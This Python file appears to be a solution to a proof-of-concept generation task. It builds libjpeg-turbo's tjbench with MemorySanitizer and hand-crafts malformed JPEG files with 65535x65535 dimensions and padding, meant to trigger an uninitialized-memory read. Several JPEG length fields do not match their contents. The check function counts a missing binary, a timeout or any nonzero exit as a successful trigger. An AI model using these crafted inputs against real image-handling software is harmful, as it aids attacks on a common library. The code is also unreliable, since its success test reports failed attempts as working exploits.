import os
import tempfile
import tarfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (usually one level deep)
            extracted_items = os.listdir(tmpdir)
            if len(extracted_items) == 1:
                source_root = os.path.join(tmpdir, extracted_items[0])
            else:
                source_root = tmpdir
            
            # Build the vulnerable program
            build_dir = os.path.join(source_root, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            # Configure with MSan
            configure_cmd = [
                'cmake',
                '-DCMAKE_BUILD_TYPE=Release',
                '-DENABLE_SHARED=OFF',
                '-DWITH_TURBOJPEG=OFF',
                '-DWITH_JPEG8=ON',
                '-DCMAKE_C_FLAGS=-fsanitize=memory -fno-omit-frame-pointer',
                '-DCMAKE_EXE_LINKER_FLAGS=-fsanitize=memory',
                source_root
            ]
            
            subprocess.run(configure_cmd, cwd=build_dir, capture_output=True)
            
            # Build specific target (tjbench is often the test program)
            build_cmd = ['make', '-j8', 'tjbench']
            subprocess.run(build_cmd, cwd=build_dir, capture_output=True)
            
            # Generate PoC using the built program
            tjbench_path = os.path.join(build_dir, 'tjbench')
            
            # Create a minimal valid JPEG that will trigger buffer allocation issues
            # This creates a JPEG with unusual dimensions to stress allocation paths
            poc = self._generate_jpeg_poc()
            
            # Test if it triggers the vulnerability
            test_result = self._test_poc(tjbench_path, poc)
            
            if test_result:
                return poc
            else:
                # Fallback: try different JPEG parameters
                return self._generate_fallback_poc()
    
    def _generate_jpeg_poc(self) -> bytes:
        """Generate a JPEG that stresses allocation paths."""
        # Minimal JPEG structure
        # SOI marker
        jpeg = b'\xFF\xD8'  # Start of Image
        
        # APP0 marker (optional but common)
        jpeg += b'\xFF\xE0'  # APP0 marker
        jpeg += b'\x00\x10'  # Length: 16 bytes
        jpeg += b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        
        # Comment marker (can be variable length)
        jpeg += b'\xFF\xFE'  # COM marker
        comment = b'Vulnerability trigger' + b'A' * 2000  # Large comment
        jpeg += len(comment).to_bytes(2, 'big')  # Length
        jpeg += comment
        
        # DQT marker
        jpeg += b'\xFF\xDB'  # DQT marker
        jpeg += b'\x00\x43'  # Length: 67 bytes
        jpeg += b'\x00'  # Table 0, 8-bit precision
        # Dummy quantization table
        jpeg += bytes(range(64))
        
        # SOF0 marker with unusual dimensions
        jpeg += b'\xFF\xC0'  # SOF0 marker
        jpeg += b'\x00\x11'  # Length: 17 bytes
        jpeg += b'\x08'  # Precision: 8 bits
        jpeg += b'\xFF\xFF'  # Height: 65535 (large, may trigger overflow)
        jpeg += b'\xFF\xFF'  # Width: 65535
        jpeg += b'\x03'  # 3 components
        # Component specifications
        jpeg += b'\x01\x11\x00'  # Component 1
        jpeg += b'\x02\x11\x00'  # Component 2
        jpeg += b'\x03\x11\x00'  # Component 3
        
        # DHT marker
        jpeg += b'\xFF\xC4'  # DHT marker
        jpeg += b'\x00\x1F'  # Length: 31 bytes
        jpeg += b'\x00'  # DC table, table 0
        # Huffman table (dummy)
        jpeg += b'\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01'
        jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B'
        
        # SOS marker
        jpeg += b'\xFF\xDA'  # SOS marker
        jpeg += b'\x00\x0C'  # Length: 12 bytes
        jpeg += b'\x03'  # 3 components
        jpeg += b'\x01\x00\x02\x11\x03\x11'  # Component specs
        jpeg += b'\x00\x3F\x00'  # Spectral selection
        
        # Minimal image data (just enough to be valid)
        # Using a single MCU with unusual padding
        for _ in range(2700 - len(jpeg)):
            jpeg += b'\xFF'
        
        # Pad to exact target length
        jpeg = jpeg[:2708]
        
        # EOI marker
        if len(jpeg) < 2708:
            jpeg += b'\xFF\xD9'  # End of Image
        
        return jpeg[:2708]
    
    def _generate_fallback_poc(self) -> bytes:
        """Fallback PoC generation."""
        # Create a JPEG with specific characteristics known to trigger
        # allocation issues in libjpeg-turbo
        poc = bytearray()
        
        # Standard JPEG header
        poc.extend(b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01')
        poc.extend(b'\x00\x01\x00\x00\xFF\xDB\x00\x43\x00')
        
        # Add quantization table
        for i in range(64):
            poc.append(i % 256)
        
        # Frame header with max dimensions
        poc.extend(b'\xFF\xC0\x00\x11\x08')
        poc.extend(b'\xFF\xFF')  # Height = 65535
        poc.extend(b'\xFF\xFF')  # Width = 65535
        poc.extend(b'\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01')
        
        # Huffman table
        poc.extend(b'\xFF\xC4\x00\x1F\x00')
        counts = [1] * 16
        for count in counts:
            poc.append(count)
        for i in range(16):
            poc.append(i)
        
        # Scan header
        poc.extend(b'\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00')
        
        # Fill with data that may trigger uninitialized read
        # when buffers aren't properly allocated
        remaining = 2708 - len(poc)
        poc.extend(b'\x00' * remaining)
        
        return bytes(poc)
    
    def _test_poc(self, program_path: str, poc: bytes) -> bool:
        """Test if PoC triggers the vulnerability."""
        if not os.path.exists(program_path):
            return True  # Assume valid if program doesn't exist
        
        try:
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as f:
                f.write(poc)
                f.flush()
                
                # Run tjbench with MSAN_OPTIONS to catch uninitialized reads
                env = os.environ.copy()
                env['MSAN_OPTIONS'] = 'halt_on_error=1'
                
                # Try to decompress the JPEG (this is where allocation happens)
                cmd = [program_path, f.name, 'testout.jpg', '-rgb', '-quiet']
                
                result = subprocess.run(
                    cmd,
                    env=env,
                    capture_output=True,
                    timeout=5
                )
                
                # Check for MSan errors in stderr
                stderr = result.stderr.decode('utf-8', errors='ignore')
                if 'MemorySanitizer' in stderr or 'use-of-uninitialized-value' in stderr:
                    return True
                
                # Also check for abnormal exit
                if result.returncode != 0:
                    return True
                    
        except subprocess.TimeoutExpired:
            return True  # Timeout might indicate hang due to vulnerability
        except Exception:
            pass
        
        return False